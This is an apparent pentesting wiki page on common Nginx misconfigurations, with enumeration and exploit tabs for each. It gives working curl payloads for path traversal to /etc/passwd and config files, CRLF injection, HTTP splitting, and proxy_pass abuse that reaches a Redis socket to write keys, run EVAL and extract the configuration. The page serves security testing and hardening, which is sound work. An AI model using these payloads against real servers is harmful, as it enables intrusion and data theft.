# Nginx

## Theory

NGINX is open source software for web serving, reverse proxying, caching, load balancing, media streaming, and more. But there is some common **Nginx misconfigurations** that, if left unchecked, leave the web site vulnerable to attack.

## Misconfigurations

### Tools

There are several tools available, such as [Gixy](https://github.com/yandex/gixy), [Gixy-Next](https://gixy.io/) and [Nginxpwner](https://github.com/stark0de/nginxpwner), which can automate the process of identifying misconfigurations in Nginx.

{% tabs %}
{% tab title="Gixy" %}
[Gixy](https://github.com/yandex/gixy) is a tool to analyze Nginx configuration. The main goal of Gixy is to prevent security misconfiguration and automate flaw detection. This is a static files analyzer.

```bash
#Static analyze
gixy /etc/nginx/nginx.conf
```

The original Gixy does not really work with Python3, but a fork [Gixy-Next](https://github.com/megamansec/gixy-next) adds support.
{% endtab %}

{% tab title="Nginxpwner" %}
[Nginxpwner](https://github.com/stark0de/nginxpwner) will dynamicly look for common Nginx misconfigurations and vulnerabilities.

```bash
#Target tab in Burp, select host, right click, copy all URLs in this host, copy to a file
cat urllist | unfurl paths | cut -d"/" -f2-3 | sort -u > /tmp/pathlist 
#Or get the list of paths you already discovered in the application in some other way. 
#Note: the paths should not start with /

#Finally, run it
python3 nginxpwner.py https://example.com /tmp/pathlist
```
{% endtab %}
{% endtabs %}

### Missing Root Location

{% tabs %}
{% tab title="Enumeration" %}
The **root** directive specifies the root folder for Nginx. In the following example, the root folder is `/etc/nginx` which means that we can reach files within that folder.

```
server {
        root /etc/nginx;

        location /hello.txt {
                try_files $uri $uri/ =404;
                proxy_pass http://127.0.0.1:8080/;
        }
}
```

In the above example, the root folder is `/etc/nginx` which means that we can reach files within that folder. The configuration does not have a location for `/ (location / {...})`
{% endtab %}

{% tab title="Exploit" %}
Because of this missconfiguration in the previous example, the root directive will be globally set, meaning that requests to `/` will take you to the local path `/etc/nginx`.

```bash
#We can get sensitive files as the nginx.conf
curl http://example.com/nginx.conf
```
{% endtab %}
{% endtabs %}

### Off-By-Slash Misconfiguration

{% tabs %}
{% tab title="Enumeration" %}
With the Off-by-slash misconfiguration, it is possible to traverse one step up the path due to a missing slash.\
Inside the Nginx configuration look the "location" statements, if someone looks like:

```
#Missing slash with alias directive
location /imgs { 
    alias /path/images/;
}

#Missing slash with proxy_pass directive
location /api {
    proxy_pass http://apiserver/v1/;
}
```
{% endtab %}

{% tab title="Exploit" %}
Because of this missconfiguration in the previous example, there is an LFI vulnerability. `/imgs../secrets.txt` will be transform to `/path/images/../secrets.txt`

```bash
#We can get sensitive files
curl http://example.com/imgs/../../secrets.txt

curl http://example.com/api/../../secrets.txt
```
{% endtab %}
{% endtabs %}

### Unsafe Variable Use

{% tabs %}
{% tab title="Enumeration" %}
Some frameworks, scripts and Nginx configurations unsafely use the variables stored by Nginx. This can lead to issues such as XSS, bypassing HttpOnly-protection, information disclosure and in some cases even RCE.

With a configuration such as the following:

```
location / {
  return 302 https://example.com$uri;
}
```

The misconfiguration related is to use `$uri` or `$document_uri` instead of `$request_uri` which results in a **CRLF injection**. This is because this two variables contain the normalized URI whereas the normalization in Nginx includes URL decoding.
{% endtab %}

{% tab title="Exploit" %}
Because of this missconfiguration in the previous example, there is an CRLF vulnerability.\
URL-encoding the new line characters (\r\n) results in the following representation of the characters `%0d%0a`.\
When these characters are included in a request like `http://localhost/%0d%0aDetectify:%20clrf` to a server with the misconfiguration, the server will respond with a new header named Detectify since the $uri variable contains the URL-decoded new line characters.

```bash
#We send the following request
curl http://example.com/%0d%0aDetectify:%20clrf

#The server respond with a new header named Detectify
#since the $uri variable contains the URL-decoded new line characters.
HTTP/1.1 302 Moved Temporarily
Server: nginx/1.19.3
Content-Type: text/html
Content-Length: 145
Connection: keep-alive
Location: https://example.com/
Detectify: clrf
```

learn more about CRLF and TTP response splitting [here](https://blog.detectify.com/2019/06/14/http-response-splitting-exploitations-and-mitigations/)
{% endtab %}
{% endtabs %}

### Raw Backend Response Reading

{% tabs %}
{% tab title="Enumeration" %}
In Nginx, `proxy_pass` you can intercept errors and HTTP headers created by the backend. This is very useful if you want to hide internal error messages. But if client sends an invalid HTTP request, it will be forwarded as-is to the backend, the backend will answer with its raw content, and then Nginx won’t understand the invalid HTTP response and just forward it to the client.

With a configuration such as the following:

```
http {
   error_page 500 /html/error.html;
   proxy_intercept_errors on;
   proxy_hide_header Secret-Header;
}
```

[proxy\_intercept\_errors](http://nginx.org/en/docs/http/ngx\_http\_proxy\_module.html#proxy\_intercept\_errors) will serve a custom response if the backend has a response status greater than 300. In our uWSGI application above, we will send a 500 Error which would be intercepted by Nginx. [proxy\_hide\_header](http://nginx.org/en/docs/http/ngx\_http\_proxy\_module.html#proxy\_hide\_header) is pretty much self explanatory; it will hide any specified HTTP header from the client.
{% endtab %}

{% tab title="Exploit" %}
Because of this missconfiguration in the previous example, if we send an invalid HTTP request, we can leak informations from the backend

```bash
#Send invalid HTTP request
GET /? XTTP/1.1
Host: 127.0.0.1
Connection: close

#Respons with leaked informations
XTTP/1.1 500 Error
Content-Type: text/html
Secret-Header: secret-info

Secret info, should not be visible!
```
{% endtab %}
{% endtabs %}

### Merge\_slashes Set To Off

{% tabs %}
{% tab title="Enumeration" %}
The [merge\_slashes](http://nginx.org/en/docs/http/ngx\_http\_core\_module.html#merge\_slashes) directive is set to `on` by default which is a mechanism to compress two or more forward slashes into one, so `///` would become `/`. If Nginx is used as a reverse-proxy and the application that’s being proxied is vulnerable to local file inclusion, using extra slashes in the request could leave room for exploit it. This is described in detail by [Danny Robinson and Rotem Bar](https://medium.com/appsflyerengineering/nginx-may-be-protecting-your-applications-from-traversal-attacks-without-you-even-knowing-b08f882fd43d)
{% endtab %}

{% tab title="Exploit" %}
Because of this missconfiguration, using multiple slashes `///` allow us to exploit that LFI vulnerability successfully.

```bash
curl "http://example.com//////../../../../../etc/passwd"
```
{% endtab %}
{% endtabs %}

### Proxy\_pass Misconfigurations

The `proxy_pass` directive can be used to redirect internally requests to other servers internal or external. The use of this directive isn't a vulnerability but you should check how it's configured.

#### HTTP Splitting

{% tabs %}
{% tab title="Enumeration" %}
If the regular expressions used in that directive are weak, they allow **HTTP splitting** to happen.

With a configuration such as the following:

```
location ~ /docs/([^/]*/[^/]*)? {
    proxy_pass https://bucket.s3.amazonaws.com/docs-website/$1.html;
}
```

the problem with this regular expressions is that it also allows newlines per default. In this case, the `[^/]*` part actually also includes encoded newlines.
{% endtab %}

{% tab title="Exploit" %}
Because of this missconfiguration, using multiple `%0d%0a` (CRLF) allow us to exploit that HTTP SPlitting vulnerability successfully. We can send the following request:

```bash
#Request
curl 'http://example.com/docs/%20HTTP/1.1%0d%0aHost:non-existing-bucket1%0d%0a%0d%0a'

#Request sent to bucket after proxy
GET /docs-website/ HTTP/1.1
Host:non-existing-bucket1

.html HTTP/1.0
Host: bucket.s3.amazonaws.com
```
{% endtab %}
{% endtabs %}

#### Controlling proxied host

{% tabs %}
{% tab title="Enumeration" %}
In some setups, a matching path is used as part of the hostname to proxy to.

```
location ~ /static/(.*)/(.*) {
    proxy_pass   http://$1-example.s3.amazonaws.com/$2;
}
```

Since the bucket is attacker controlled (part of the URI path) this leads to XSS but also has further implications.

We could make `proxy_pass` connect to a local unix socket as it supports proxying requests to local `unix` sockets. What might be surprising is that the URI given to `proxy_pass` can be prefixed with `http://` or as a UNIX-domain socket path specified after the word `unix` and enclosed in colons:

```
proxy_pass http://unix:/tmp/backend.sock:/uri/;
```
{% endtab %}

{% tab title="Exploit" %}
Because of this missconfiguration, we can send a request to a local unix socket.

```bash
#Request
curl 'http://example.com/static/unix:%2ftmp%2fsocket.sock:TEST/app-1555347823-min.js'

#Request sent to /tmp/socket.sock after proxy
GET TEST-example.s3.amazonaws.com/app-1555347823-min.js HTTP/1.0
Host: localhost
Connection: close
```

For example, we can use it to make requests to a Redis socket and **write any key**:

```bash
#Request that set the key: "hacked" "isadmin" true
curl -X HSET "http://example.com/static/unix:/var/run/redis/redis.sock:hacked%20isadmin%20true%20/random"

#Request sent to /var/run/redis/redis.sock (Redis socket)
HSET hacked "isadmin" "true" -example.s3.amazonaws.com/app-1555347823-min.js HTTP/1.0
Host: localhost
Connection: close
```

**Arbitrary Redis command execution** vulnerability may be abuse using the [EVAL](https://redis.io/commands/eval/) command from Redis. We can execute Redis commands from EVAL using two different Lua functions: `redis.call()` and `redis.pcall()`

```bash
# Request to overwrite the maxclients config key:
curl -X EVAL "http://example.com/static/unix:/var/run/redis/redis.sock:%22return%20redis.call('config','set','maxclients',1337)%22%200%20/app-1555347823-min.js" 

#Request sent to /var/run/redis/redis.sock (Redis socket)
EVAL "return redis.call('config','set','maxclients',1337)" 0 -example.s3.amazonaws.com/app-1555347823-min.js HTTP/1.0
Host: localhost
Connection: close
```

{% hint style="info" %}
None of these commands respond with a valid HTTP response, and Nginx will not forward the output of the commands to the client, but instead a generic 502 Bad Gateway error.
{% endhint %}

**Extracting data** can be done avoiding the `502` error by simply having the string `HTTP/1.0 200 OK` anywhere in the response using string concatenation in the Lua script.

```bash
#Request to extract response from the CONFIG GET * command
#You may use other commands like redis.call("hgetall","key") for HGETALL
curl -X EVAL 'http://example.com/static/unix:/var/run/redis/redis.sock:%27return%20(table.concat(redis.call("config","get","*"),"\n").."%20HTTP/1.1%20200%20OK\r\n\r\n")%27%200%20/app-1555347823-min.js'

#Request sent to /var/run/redis/redis.sock (Redis socket)
EVAL 'return (table.concat(redis.call("config","get","*"),"\n").." HTTP/1.1 200 OK\r\n\r\n")' 0 -example.s3.amazonaws.com/app-1555347823-min.js HTTP/1.0
Host: localhost
Connection: close
```
{% endtab %}
{% endtabs %}

## Resources

{% embed url="https://blog.detectify.com/2020/11/10/common-nginx-misconfigurations/" %}

{% embed url="https://labs.detectify.com/2021/02/18/middleware-middleware-everywhere-and-lots-of-misconfigurations-to-fix/" %}

{% embed url="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/nginx" %}
